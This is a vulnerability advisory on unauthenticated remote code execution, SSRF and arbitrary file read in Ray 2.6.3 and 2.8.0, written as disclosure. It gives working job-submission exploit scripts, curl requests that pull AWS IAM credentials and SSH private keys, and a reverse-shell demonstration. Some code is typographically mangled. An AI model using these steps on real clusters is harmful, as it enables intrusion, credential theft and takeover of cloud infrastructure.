The following document describes identified vulnerabilities in the Ray application version 2.6.3 and 2.8.0.

### Update 12/4/2023

CORRECTION: The CVE IDs for the Missing Authentication and Server-Side Request Forgery vulnerabilities were swapped in the original version of the post. This has been corrected.

### Vendor Response

Anyscale has released Ray version 2.8.1 and states the release addresses two of the three issues identified in the advisory: the Server-Side Request Forgery and Insecure Input Validation vulnerabilities. Authentication is not yet supported in Ray as of this update. 

Bishop Fox recommends that Ray users deploy their clusters in isolated networks and control access using other mechanisms, such as SSH bastion hosts. If access to the Ray dashboard is required outside of an isolated network, Ray users could expose it via a reverse proxy service configured to require authentication.

[Anyscale has published a blog post responding to this disclosure](https://www.anyscale.com/blog/update-on-ray-cves-cve-2023-6019-cve-2023-6020-cve-2023-6021-cve-2023-48022-cve-2023-48023) and has also updated their product documentation to warn users regarding the danger of exposing Ray services without additional security controls.

### Product Vendor

Anyscale

### Product Description

Ray is an open-source unified compute framework that makes it easy to scale AI and Python workloads. The project’s official website is [www.ray.io](http://www.ray.io) and the official repository [https://github.com/ray-project...](https://github.com/ray-project/ray). The latest version of the application is 2.8.1, released on December 1, 2023 at <https://github.com/ray-project/ray/releases/tag/ray-2.8.1>.

### Vulnerabilities List

Bishop Fox notified Anyscale of three vulnerabilities in Ray on August 28, 2023. Near the end of Bishop Fox’s 90-day disclosure window, Protect AI revealed that they had previously reported two of the three vulnerabilities to Anyscale, but did not disclose those vulnerabilities until November 16, 2023. Bishop Fox is including details of all three vulnerabilities because our discussion of the issues differs from and complements Protect AI’s documentation.

  * Missing Authentication
  * Server-Side Request Forgery (SSRF) – first reported by Protect AI
  * Insecure Input Validation – first reported by Protect AI

These vulnerabilities are described in the following sections.

### Affected Versions

Version 2.6.3 and 2.8.0

### Summary of Findings

The Ray framework does not offer authentication and input validation in at least two of its components: Ray Dashboard and Ray Client. This makes it possible for unauthorized users to obtain operating system access to all nodes in the Ray cluster or attempt to retrieve Ray EC2 instance credentials (in a typical AWS cloud install).

### Impact

A remote unauthorized user can obtain any data, scripts or files stored in the cluster. In addition, if the Ray framework is installed in the cloud (i.e. AWS), it is possible to retrieve highly privileged IAM credentials that allow privilege escalation. At the time of writing, the Ray GitHub repository has been forked over 4,900 times and the Ray Docker image has been pulled approximately five million times.

### Solution

Anyscale has not addressed the vulnerabilities. Bishop Fox recommends that Ray users refrain from exposing the Ray network services to a local network or to the Internet.

## Vulnerabilities

### Missing Authentication

The APIs in two Ray components: Dashboard and Client, do not implement authentication controls. This lack of authentication mechanisms allows unauthorized actors to freely submit jobs, delete existing jobs, retrieve sensitive information, and achieve remote command execution. The vulnerability could be exploited to obtain operating system access to all nodes in the Ray cluster or attempt to retrieve Ray EC2 instance credentials. (in a typical AWS cloud install).

### Vulnerability Details

CVE ID: CVE-2023-48022

Vulnerability Type: Missing Authentication for Critical Function

Access Vector: ☒ Remote, ☐ Local, ☐ Physical, ☐ Context dependent, ☐ Other (if other, please specify)

Impact: ☒ Code execution, ☐ Denial of service, ☐ Escalation of privileges, ☒ Information disclosure, ☐ Other (if other, please specify)

Security Risk: ☒ Critical, ☐ High, ☐ Medium, ☐ Low

Vulnerability: CWE-306, CWE-1211

In the default configuration, Ray does not enforce authentication. As a result, attackers may freely submit jobs, delete existing jobs, retrieve sensitive information, and exploit the other vulnerabilities described in this advisory. While the Ray documentation included an optional mutual TLS authentication mode, Ray does not appear to support an authorization model. In other words, even if a Ray administrator explicitly enabled TLS authentication, they would be unable to grant users different permissions, such as read-only access to the Ray Dashboard. 

The most direct method of exploitation discovered is to submit arbitrary operating system commands for execution via the job submission API using a raw HTTP request or the Ray Jobs Python SDK. These do not require authentication in the default configuration, and are accessible remotely to any system with access to the Ray Dashboard (TCP port 8265 by default). 

The figure below demonstrates crafting a JSON job submission to execute the Linux shell command cat `/etc/passwd`, sending the malicious JSON file to the jobs API, and then retrieving the output of the executed command: 
  
  
  $ cat cat_passwd.json

**FIGURE 1** \- Executing arbitrary operating system commands via the job API

[Protect AI published a MetaSploit Framework module that exploits this technique along with their disclosure](https://github.com/protectai/ai-exploits/blob/main/ray/msfmodules/ray_job_rce.py), although they did not call out the lack of authentication as a vulnerability. Researcher Bryce Bearchell independently submitted two reports to Protect AI’s huntr platform (<https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/> and <https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/>) during the same time period that Bishop Fox reported the issue directly to Anyscale. However, the reports were closed based on Anyscale’s position that the behavior is by design, and therefore should not be perceived as a vulnerability.

The Ray Jobs Python SDK can also be used to execute code remotely without authentication. The arbitrary command execution is obtained by crafting a malicious Python script using the Ray API to submit a task and then calling this malicious script in the entrypoint parameter of the `JobSubmissionClient` object, as shown below: 
  
  
  $ cat malicious.py
  import ray
  import os
  
  @ray.remote
  def compromise_system():
  os.system(‘cat /etc/passwd’)
  
  # Automatically connect to the running Ray cluster.
  Ray.init()
  print(ray.get(compromise_system.remote()))
  
  $ cat jobs.py
  from ray.job_submission import JobSubmissionClient, JobStatus
  import time
  
  # If using a remote cluster, replace 127.0.0.1 with the head node’s IP address.
  Client = JobSubmissionClient(“http://127.0.0.1:8265”)
  job_id = client.submit_job(
  # Entrypoint shell command to execute
  entrypoint=”python malicious.py”,
  # Path to the local directory that contains the script.py file
  runtime_env={“working_dir”: “./”}
  )
  print(job_id)
  
  def wait_until_status(job_id, status_to_wait_for, timeout_seconds=5):
  start = time.time()
  while time.time() – start <= timeout_seconds:
  status = client.get_job_status(job_id)
  print(f”status: {status}”)
  if status in status_to_wait_for:
  break
  time.sleep(1)
  
  
  wait_until_status(job_id, {JobStatus.SUCCEEDED, JobStatus.STOPPED, JobStatus.FAILED})
  logs = client.get_job_logs(job_id)
  print(logs)

**FIGURE 2** \- Scripts to obtain command execution using Ray Jobs Python SDK

Executing the jobs.py script on a device with network connectivity to the Ray API causes the malicious task script to execute on a Ray cluster node and retrieve the output of system command cat `/etc/passwd`, as shown below: 
  
  
  $ python3 jobs.py

**FIGURE 3** \- Remote command execution via Ray Jobs Python SDK

Additionally, the Ray Client API – exposed on TCP port 10001 by default – is vulnerable to unauthenticated remote code execution via a very similar technique: 
  
  
  $ cat malicious_init.py 
  
  import ray 
  import os
  
  @ray.remote
  def compromise_system():
  os.system(‘cat /etc/passwd’)
  
  # Automatically connect to the running Ray cluster.
  Ray.init(address=”ray://<ray_cluster_head_ip>:10001”)
  print(ray.get(compromise_system.remote()))

  (compromise_system pid=1038) sys:x:3:3:sys:/dev:/usr/sbin/nologin
  …omitted for brevity…

  (compromise_system pid=1038) messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
  

**FIGURE 4** \- Scripts to obtain command execution using Ray Client API

As shown above, the Ray Client API is also vulnerable to arbitrary, unauthenticated command execution, as demonstrated by reading the content of the /etc/passwd file. Bishop Fox does not believe this variation on the overall vulnerability has been disclosed previously.

[Researcher Bryce Bearchell submitted a separate variation on this issue to Protect AI on August 30, 2023](https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/). That additional variant affects a different Ray API, running on port 52365.

An attacker can use the above techniques to obtain operating system access to all nodes in the Ray cluster, or attempt to retrieve Ray EC2 instance credentials, as discussed in the SSRF finding of this advisory. 

## Server-Side Request Forgery (SSRF)

The Ray Dashboard API is affected by a Server-Side Request Forgery (SSRF) vulnerability in the `url` parameter of the `/log_proxy` API endpoint. The API does not perform sufficient input validation within the affected parameter and any HTTP or HTTPS URLs are accepted as valid. The issue is exploitable without authentication and is dependent only on network connectivity to the Ray Dashboard port (8265 by default). The vulnerability could be exploited to retrieve the highly privileged IAM credentials required by Ray from the AWS metadata API.

[This vulnerability was also reported by researcher Harry Ha to Protect AI on July 21st, 2022](https://huntr.com/bounties/448bcada-9f6f-442e-8950-79f41efacfed/), but the report was not made public until November 2023. 

### Vulnerability Details

CVE ID: CVE-2023-48023

Vulnerability Type: Server-Side Request Forgery (SSRF)

Access Vector: ☒ Remote, ☐ Local, ☐ Physical, ☐ Context dependent, ☐ Other (if other, please specify)

Impact: ☒ Code execution, ☐ Denial of service, ☒ Escalation of privileges, ☒ Information disclosure, ☐ Other (if other, please specify)

Security Risk: ☒ Critical, ☐ High, ☐ Medium, ☐ Low

Vulnerability: CWE-441, CWE-918

An SSRF vulnerability was identified in the Ray Dashboard API that can be used to proxy any HTTP or HTTPS request to another system via the Ray API. Bishop Fox staff demonstrated exploiting the vulnerability to retrieve the highly privileged IAM credentials required by Ray from the AWS metadata API. This issue was exploitable without authentication and requires network connectivity to the Ray Dashboard port (8265 by default). 

The URL parameter of the `/log_proxy` API endpoint did not perform sufficient input validation and accepted any HTTP or HTTPS URLs as valid. As a result, an attacker could proxy any HTTP or HTTPS GET request through the API.  
Bishop Fox demonstrated the impact of this vulnerability in a typical cloud install of Ray by using it to retrieve IAM credentials from the AWS metadata endpoint, as shown below: 
  
  
  $ curl -v "http://127.0.0.1:8265/log_proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ray-autoscaler-v1"

**FIGURE 5** \- Retrieving and validating IAM EC2 instance credentials associated with the Ray server

As discussed in the Ray documentation, Ray nodes are, by default, are granted full EC2 and S3 permissions.

![FIGURE 6 - Documentation regarding Ray’s default EC2 and S3 permissions](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Ray-Any-Scale.jpg)

**FIGURE 6** \- Documentation regarding Ray’s default EC2 and S3 permissions

The implications of retrieving the Ray EC2 instance credentials is that an attacker can modify an existing EC2 instance in the cloud environment to connect back to an attacking system at boot, as shown below: 
  
  
  $ cat b64code.txt
  
  Content-Type: multipart/mixed; boundary=”//”

  $ aws ec2 start-instances --instance-ids i-05f[REDACTED]

**FIGURE 7** \- Using captured credentials to apply a malicious configuration to an existing instance

As shown in the following figure, a netcat listener received a connection from the instance running in the context of the root user: 
  
  
  $ nc -l 7733 
  
  bash: cannot set terminal process group (1364): Inappropriate ioctl for device bash: no job control in this shell
  root@ip-172-31-38-107:/# id
  uid=0(root) gid=0(root) groups=0(root)
  

**FIGURE 8** \- Reverse TCP shell connection from modified EC2 instance

An attacker could proxy other HTTP traffic through a vulnerable Ray instance to mask the true source of malicious traffic.

## Insecure Input Validation

The Ray Dashboard API is affected by an Insecure Input Validation vulnerability in the filename parameter of the `/api/v0/logs/file` API endpoint. The API does not perform sufficient input validation within the affected parameter and any arbitrary filesystem path is accepted as valid. The issue is exploitable without authentication, but is dependent on network connectivity to the Ray Dashboard port (8265 by default). The vulnerability could be exploited to retrieve sensitive filesystem such as the SSH private key used by Ray to authenticate to other nodes in the associated cluster.  

[This vulnerability was also reported to Protect AI by researcher Dan McInerney on August 24th, 2023](https://huntr.com/bounties/5039c045-f986-4cbc-81ac-370fe4b0d3f8/), but the report was not made public until November 16, 2023.

Vulnerability: CWE-20, CWE-73

An insecure input validation is present in the Ray Dashboard’s `/api/v0/logs/file` API endpoint. The endpoint accepts arbitrary filesystem paths and does not require authentication, only connectivity to the Ray Dashboard port (8265 by default). The vulnerability was exploited to obtain the SSH private key used by Ray to authenticate to all other nodes in the associated cluster.

To trigger the vulnerability, a valid `node_id` value was required. A `node_id` could be obtained in the Cluster section of the Ray Dashboard web app in the ID column of the Node List section. In the figure below, the ID of the head node is `f3a532dccac4c7fc7a51a82521022f3077bcbf5d03e160502c34a82c`

It is also possible to obtain the node ID calling the Dashboard API `/nodes?view=summary` as shown below:
  
  
  $ curl -s "http://127.0.0.1:8265/nodes?view=summary" | jq -r '.data.summary[].raylet | select(.isHeadNode==true) | .nodeId'

If a valid `node_id` value is included in the request, the Ray Dashboard API returns the content of any file accessible to the account the web application server is running as. For example, in response to a `curl` command, the API returns the content of the server’s `/etc/passwd` file, as shown below:
  
  
  $ export node_id=$(curl -s "http://127.0.0.1:8265/nodes?view=summary" | jq -r '.data.summary[].raylet | select(.isHeadNode==true) | .nodeId')
  
  $ curl "http://127.0.0.1:8265/api/v0/logs/file?node_id=$node_id&filename=/etc/passwd&lines=100"

**FIGURE 11** \- Reading `/etc/passwd` file remotely

In a typical AWS cloud install, one can find a bootstrap config file in the home directory of the ray user. This bootstrap config file contains various details such as the cluster settings, including the full filesystem path where an SSH key is stored.

After obtaining the home directory of the ray user from the `/etc/passwd` file, it is possible to exploit the same vulnerability to retrieve the Ray bootstrap configuration file. As shown below, the bootstrap configuration file contained the path to an SSH private key:
  
  
  $ curl "http://127.0.0.1: 8265/api/v0/logs/file?node_id=$node_id&filename=/home/ray/ray_bootstrap_config.yaml&lines=100"

FIGURE 12 - Retrieving bootstrap configuration file

The SSH private key is used by Ray for communication between cluster nodes. It is possible to read the private key content using the same vulnerable API, and then, use it to access cluster nodes via SSH, as shown below:
  
  
  $ curl "http://127.0.0.1:8265/api/v0/logs/file?node_id=$node_id&filename=/home/ray/ray_bootstrap_key.pem&lines=100"
